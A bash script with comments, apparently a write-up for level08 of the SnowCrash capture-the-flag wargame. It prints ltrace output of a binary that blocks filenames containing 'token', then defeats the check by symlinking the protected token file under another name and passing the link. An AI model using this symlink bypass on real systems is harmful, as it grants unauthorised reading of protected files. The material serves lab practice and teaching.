#!/bin/bash
# Here is a test run of the program using ltrace :
# ltrace ./level08 hurrdurr
# __libc_start_main(0x8048554, 2, 0xbffff7a4, 0x80486b0, 0x8048720 <unfinished ...>
# strstr("hurrdurr", "token")                                               = NULL
# open("hurrdurr", 0, 014435162522)                                         = -1
# err(1, 0x80487b2, 0xbffff8cc, 0xb7fe765d, 0xb7e3ebaflevel08: Unable to open hurrdurr: No such file or directory
#  <unfinished ...>
# +++ exited (status 1) +++
#
# The program checks if the string token is contained in the string passed as argument, then tries to open it.
#
# If we pass "token" as first argument, this is the ouput of ltrace :
# level08@SnowCrash:~$ ltrace ./level08 token
# __libc_start_main(0x8048554, 2, 0xbffff7a4, 0x80486b0, 0x8048720 <unfinished ...>
# strstr("token", "token")                                                  = "token"
# printf("You may not access '%s'\n", "token"You may not access 'token'
# )                              = 27
# exit(1 <unfinished ...>
# +++ exited (status 1) +++
#
# The program checks that we have the rights on the file to open.
# With all this information we figured that we needed to create a symlink to the token file.
# This way we will have the rights on the symlink and open will follow the link towards the token file.

# Not using the absolute path of the file will return an error when trying to open.
ln -s ~/token /var/crash/l
./level08 /var/crash/l
